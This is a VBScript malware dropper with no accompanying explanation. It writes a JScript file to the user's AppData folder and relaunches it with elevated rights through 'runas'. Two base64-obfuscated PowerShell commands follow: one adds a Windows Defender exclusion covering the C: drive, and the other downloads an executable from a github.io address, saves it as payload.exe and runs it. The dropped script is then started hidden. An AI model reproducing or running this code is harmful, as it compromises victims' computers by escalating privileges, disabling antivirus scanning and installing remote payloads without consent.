S e t   f s o   =   C r e a t e O b j e c t ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " ) :   S e t   s h e l l   =   C r e a t e O b j e c t ( " W S c r i p t . S h e l l " ) :   a p p D a t a   =   s h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % A P P D A T A % " ) :   f o l d e r P a t h   =   a p p D a t a   &   " \ C u s t o m - A p p l i c a t i o n " :   I f   N o t   f s o . F o l d e r E x i s t s ( f o l d e r P a t h )   T h e n   f s o . C r e a t e F o l d e r ( f o l d e r P a t h ) :   f s o . C r e a t e F o l d e r ( f o l d e r P a t h   &   " \ F i l e s " )  
 S e t   v b s f i l e   =   f s o . C r e a t e T e x t F i l e ( f o l d e r P a t h   &   " \ F i l e s \ N e w - F i l e . j s " ,   T r u e )  
 v b s f i l e . W r i t e L i n e   " E n s u r e E l e v a t e d P r i v i l e g e s ( ) ; "  
 v b s f i l e . W r i t e L i n e   " f u n c t i o n   E n s u r e E l e v a t e d P r i v i l e g e s ( )   { "  
 v b s f i l e . W r i t e L i n e   "         i f   ( ! W S c r i p t . A r g u m e n t s . N a m e d . E x i s t s ( " " e l e v a t e " " ) )   { "  
 v b s f i l e . W r i t e L i n e   "                 n e w   A c t i v e X O b j e c t ( " " S h e l l . A p p l i c a t i o n " " ) . S h e l l E x e c u t e ( W S c r i p t . F u l l N a m e ,   W S c r i p t . S c r i p t F u l l N a m e   +   " "   / e l e v a t e " " ,   " " " " ,   " " r u n a s " " ,   1 ) ; "  
 v b s f i l e . W r i t e L i n e   "                 W S c r i p t . Q u i t ( ) ; "  
 v b s f i l e . W r i t e L i n e   "         } "  
 v b s f i l e . W r i t e L i n e   " } "  
 v b s f i l e . W r i t e L i n e   " v a r   W s h S h e l l   =   n e w   A c t i v e X O b j e c t ( " " W S c r i p t . S h e l l " " ) ; "  
 v b s f i l e . W r i t e L i n e   " W s h S h e l l . r u n ( " " p o w e r s h e l l   - e n c   c A B v A H c A Z Q B y A H M A a A B l A G w A b A A u A G U A e A B l A C A A L Q B j A G 8 A b Q B t A G E A b g B k A C A A I g B B A G Q A Z A A t A E 0 A c A B Q A H I A Z Q B m A G U A c g B l A G 4 A Y w B l A C A A L Q B F A H g A Y w B s A H U A c w B p A G 8 A b g B Q A G E A d A B o A C A A I g B D A D o A X A A N A A o A " " ,   0 ,   t r u e ) ; "  
 v b s f i l e . W r i t e L i n e   " W s h S h e l l . r u n ( " " p o w e r s h e l l   - e n c   J A B 1 A H I A b A A g A D 0 A I A A i A G g A d A B 0 A H A A c w A 6 A C 8 A L w B y A G U A Y Q B k A H I A Z Q B 2 A G k A Z Q B 3 A G U A c w A u A G c A a Q B 0 A G g A d Q B i A C 4 A a Q B v A C 8 A b g B l A H c A c g B h A H c A c w A v A H Q A Z Q B z A H Q A a Q B u A G c A L g B l A H g A Z Q A i A A o A J A B v A H U A d A B w A H U A d A A g A D 0 A I A A i A C Q A Z Q B u A H Y A O g B h A H A A c A B k A G E A d A B h A C 8 A c A B h A H k A b A B v A G E A Z A A u A G U A e A B l A C I A C g B J A G 4 A d g B v A G s A Z Q A t A F c A Z Q B i A F I A Z Q B x A H U A Z Q B z A H Q A I A A t A F U A c g B p A C A A J A B 1 A H I A b A A g A C 0 A T w B 1 A H Q A R g B p A G w A Z Q A g A C Q A b w B 1 A H Q A c A B 1 A H Q A C g B T A H Q A Y Q B y A H Q A L Q B Q A H I A b w B j A G U A c w B z A C A A L Q B G A G k A b A B l A F A A Y Q B 0 A G g A I A A k A G 8 A d Q B 0 A H A A d Q B 0 A A = = " " ,   0 ,   t r u e ) ; "  
 v b s f i l e . W r i t e L i n e   " W S c r i p t . Q u i t ( ) ; "  
 v b s f i l e . C l o s e  
 C r e a t e O b j e c t ( " S h e l l . A p p l i c a t i o n " ) . S h e l l E x e c u t e   " w s c r i p t . e x e " ,   " " " "   &   f o l d e r P a t h   &   " \ F i l e s \ N e w - F i l e . j s " " " ,   " " ,   " " ,   0 